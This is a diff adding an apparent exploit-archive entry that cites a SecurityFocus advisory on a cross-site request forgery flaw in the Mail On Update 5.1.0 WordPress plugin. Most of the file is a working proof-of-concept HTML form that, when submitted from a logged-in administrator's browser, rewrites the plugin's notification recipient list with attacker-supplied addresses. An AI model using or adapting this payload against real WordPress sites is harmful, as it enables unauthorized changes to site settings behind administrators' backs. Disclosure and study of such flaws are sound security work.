@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/59932/info
+
+The Mail On Update plugin for WordPress is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions in the context of the affected application. Other attacks are also possible.
+
+Mail On Update 5.1.0 is vulnerable; prior versions may also be affected. 
+
+<html><form action="https://example.com/wp/wp-admin/options-general.php?page=mail-on-update"; method="post" 
+class="buttom-primary">
+<input name="mailonupdate_mailto" type="hidden" value="example0 () example com
+example1 () example com
+example2 () example com
+example3 () example com
+example4 () example com
+example5 () example com
+example6 () example com
+example7 () example com
+example8 () example com
+example9 () example com
+example10 () example com
+henri+monkey () nerv fi" />
+<input name="submit" type="submit" value="Save"/></form></html>
